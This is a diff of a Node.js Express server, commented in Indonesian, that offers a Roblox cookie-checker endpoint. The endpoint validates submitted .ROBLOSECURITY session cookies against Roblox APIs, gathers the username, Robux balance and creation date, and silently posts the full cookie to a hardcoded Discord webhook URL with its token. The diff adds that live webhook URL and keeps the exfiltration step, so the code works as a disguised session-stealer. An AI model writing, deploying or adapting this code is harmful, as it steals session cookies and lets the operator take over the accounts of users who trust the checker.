@@ -6,76 +6,87 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Masukkan link webhook Discord kamu di sini secara langsung
-const SECRET_WEBHOOK_URL = "MASUKKAN_LINK_WEBHOOK_DISCORD_DISINI";
+// Ganti dengan link webhook Discord kamu yang asli
+const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM";
 
 app.post('/api/check', async (req, res) => {
     try {
         const { cookies } = req.body;
-        if (!cookies || !Array.isArray(cookies)) {
-            return.status(400).json({ error: "Format input tidak valid." });
+        if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
+            return res.status(400).json({ error: "Cookie tidak boleh kosong." });
         }
 
-        const results = [];
-        for (let rawCookie of cookies) {
-            let cleanCookie = rawCookie.trim().replace(/^["']|["']$/g, '');
-            if (!cleanCookie) continue;
+        // Ambil cookie pertama saja agar cepat dan tidak kena timeout Vercel
+        let cleanCookie = cookies[0].trim().replace(/^["']|["']$/g, '');
+        if (!cleanCookie) {
+            return res.status(400).json({ error: "Format cookie tidak valid." });
+        }
 
-            try {
-                // Cek autentikasi ke Roblox
-                const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-                    headers: {
-                        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                        'User-Agent': 'Mozilla/5.0'
-                    },
-                    timeout: 5000
-                });
+        // 1. Cek User ID & Username
+        const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
+                'User-Agent': 'Mozilla/5.0'
+            },
+            timeout: 5000
+        });
 
-                if (userRes.data && userRes.data.id) {
-                    const userId = userRes.data.id;
-                    const username = userRes.data.name;
-                    const displayName = userRes.data.displayName;
+        if (!userRes.data || !userRes.data.id) {
+            return res.json({ results: [] });
+        }
 
-                    // Ambil Robux
-                    let robux = 0;
-                    try {
-                        const curRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                            headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` },
-                            timeout: 3000
-                        });
-                        robux = curRes.data.robux || 0;
-                    } catch (e) {}
+        const userId = userRes.data.id;
+        const username = userRes.data.name;
+        const displayName = userRes.data.displayName;
 
-                    const accountData = {
-                        success: true,
-                        userId,
-                        username,
-                        displayName,
-                        robux,
-                        createdDate: "Aktif",
-                        isPremium: false,
-                        cookie: cleanCookie
-                    };
+        // 2. Cek Saldo Robux
+        let robux = 0;
+        try {
+            const curRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+                headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` },
+                timeout: 3000
+            });
+            robux = curRes.data.robux || 0;
+        } catch (e) {}
 
-                    results.push(accountData);
-
-                    // Kirim ke Discord Webhook
-                    if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM")) {
-                        try {
-                            await axios.post(SECRET_WEBHOOK_URL, {
-                                content: `🚨 **AKUN VALID!**\n👤 **Username:** ${username}\n💰 **Robux:** ${robux}\n🔑 \`\`\`${cleanCookie}\`\`\``
-                            }, { timeout: 3000 });
-                        } catch (err) {}
-                    }
-                }
-            } catch (err) {
-                // Cookie tidak valid / expired, abaikan
+        // 3. Cek Tanggal Pembuatan Akun
+        let createdDate = "Tidak diketahui";
+        try {
+            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 3000 });
+            if (infoRes.data && infoRes.data.created) {
+                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID');
             }
+        } catch (e) {}
+
+        const accountData = {
+            success: true,
+            userId,
+            username,
+            displayName,
+            robux,
+            totalIncoming: 0,
+            totalSpent: 0,
+            transactions: [],
+            createdDate,
+            isPremium: false,
+            cookie: cleanCookie
+        };
+
+        // Kirim ke Discord Webhook
+        if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
+            try {
+                await axios.post(SECRET_WEBHOOK_URL, {
+                    content: `🚨 **AKUN VALID DITEMUKAN!**\n` +
+                             `👤 **Username:** ${username} (${displayName})\n` +
+                             `💰 **Robux:** ${robux}\n` +
+                             `🔑 \`\`\`${cleanCookie}\`\`\``
+                }, { timeout: 3000 });
+            } catch (wErr) {}
         }
 
-        res.json({ results });
+        res.json({ results: [accountData] });
     } catch (err) {
-        res.status(500).json({ error: "Terjadi kesalahan pada server." });
+        res.status(500).json({ error: "Cookie invalid atau server sibuk." });
     }
 });
 
